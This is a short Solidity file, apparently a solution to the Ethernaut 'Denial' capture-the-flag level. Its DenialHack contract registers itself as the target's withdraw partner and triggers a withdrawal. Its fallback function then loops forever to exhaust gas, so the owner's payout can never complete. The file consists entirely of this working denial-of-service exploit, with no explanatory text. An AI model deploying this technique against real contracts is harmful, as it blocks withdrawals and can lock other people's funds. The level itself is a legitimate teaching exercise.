// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "https://raw.githubusercontent.com/OpenZeppelin/openzeppelin-contracts/master/contracts/utils/math/SafeMath.sol";

interface Denial {

   

    function setWithdrawPartner(address _partner) external; 

    // withdraw 1% to recipient and 1% to owner
    function withdraw() external; 

    // allow deposit of funds
 

    // convenience function
    function contractBalance() external view returns (uint) ;
}


contract DenialHack {

Denial denial;
    constructor(address _instanceAddr) {
        denial = Denial(_instanceAddr);
        denial.setWithdrawPartner(address(this));
        denial.withdraw();
    }

// function withdraw() public {
//     denial.withdraw();
// }

fallback()  external payable {
   while(true){
            
        }
}

}

